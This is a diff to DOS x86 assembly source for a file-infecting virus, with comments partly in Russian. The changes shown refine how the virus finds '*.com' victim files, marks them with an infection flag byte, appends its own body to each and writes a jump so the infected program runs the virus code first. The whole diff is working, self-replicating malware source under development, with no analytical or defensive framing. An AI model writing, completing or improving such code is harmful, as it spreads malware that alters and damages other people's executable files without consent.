@@ -3,14 +3,16 @@
 org 100h
 start:
 
-hardcode:
+db 0e9h, 1, 0 ; трехбайтный jmp
+db 069h ; флаг заражения (можно поменять на 0ffh, чтобы дебагер правильно понял ближайшие команды)
+
+inserted_code:
 
     mov bp, 0
 
 code:
 
-    ; reverting first bytes
-    push bx
+    ; возвращение первых четырех байтов оригинальной программы
     mov bx, 100h
     mov al, [bp + offset leading_bytes[0]]
     mov ah, [bp + offset leading_bytes[1]]
@@ -19,14 +21,13 @@ code:
     mov al, [bp + offset leading_bytes[2]]
     mov ah, [bp + offset leading_bytes[3]]
     mov word ptr[bx], ax
-    pop bx
 
-    ; setting dta on file
+    ; устанвока dta на file
     mov ah, 1ah
     lea dx, [bp + file]
     int 21h
 
-    ; finding victim file
+    ; поиск файла-жертвы
     lea dx, [bp + file_mask]
     mov ah, 4eh
     int 21h
@@ -52,17 +53,14 @@ file_err:
 
 file_err_skip:
 
-    ; mov ax, file.ftime
-
-    ; moving carret to the end to get the payload offset
+    ; moving carret to the end to get original size
     mov cx, 0
     mov dx, 0
     mov ax, 4202h
     int 21h
     mov [bp + payload_offset], ax
     mov [bp + jmp_length], ax
-    ; add ax, 100h
-    add ax, 1
+    sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
     mov [bp + victim_bp], ax
     
     ; moving carret to the start
@@ -78,7 +76,7 @@ file_err_skip:
     int 21h
 
     ; checking the infection flag
-    cmp [bp + leading_bytes + 3], 0ffh
+    cmp [bp + leading_bytes + 3], 069h
     jnz find_next_skip
 
 find_next:
@@ -115,7 +113,7 @@ find_next_skip:
     mov ah, 40h
     int 21h
 
-    mov [bp + byte_buffer], 0ffh
+    mov [bp + byte_buffer], 069h
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
@@ -127,46 +125,29 @@ find_next_skip:
     mov ax, 4202h
     int 21h
 
-    ; writing payload hardcode
+    ; writing inserting code
     mov [bp + byte_buffer], 0bdh ; mov bp command
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
     int 21h
 
-    mov ax, [bp + victim_bp]
-    mov [bp + word_buffer], ax
-    lea dx, [bp + word_buffer]
+    lea dx, [bp + victim_bp] ; value for bp
     mov cx, 2
     mov ah, 40h
     int 21h
 
-    mov [bp + byte_buffer], 08bh ; wtf
-    lea dx, [bp + byte_buffer]
-    mov cx, 1
-    mov ah, 40h
-    int 21h
+    ; mov [bp + byte_buffer], 08bh ; wtf
+    ; lea dx, [bp + byte_buffer]
+    ; mov cx, 1
+    ; mov ah, 40h
+    ; int 21h
 
-    ; writing payload code
+    ; writing virus
     lea dx, [bp + code]
-    add dx, 1
-    ; add dx, bp
-    mov cx, offset harddata
+    ; add dx, 1
+    mov cx, offset vir_end
     sub cx, offset code
-    mov ah, 40h
-    int 21h
-
-    ; writing payload harddata
-    lea dx, [bp + leading_bytes]
-    mov cx, 4
-    mov ah, 40h
-    int 21h
-    
-    ; writing payload data
-    mov dx, bp
-    add dx, offset data
-    lea cx, afterall
-    sub cx, offset data
     mov ah, 40h
     int 21h
 
@@ -233,13 +214,9 @@ procedures:
         jmp str_c2f_popret
     str_c2f endp
 
-harddata:
-
-    leading_bytes db 0b4h, 4ch, 0cdh, 21h
-
 data:
 
-    test1 dw 0abcdh
+    leading_bytes db 0b4h, 4ch, 0cdh, 21h
     
     ; 13-byte string for filename
     Str13 struc
@@ -270,8 +247,8 @@ data:
     jmp_length dw ?
     
     file_mask db '*.com*', 0
-    file_err_msg db 'No any other files to infect', 13, 10, '$'
+    file_err_msg db 'No any files to infect', 13, 10, '$'
 
-afterall:
+vir_end:
 
 end start
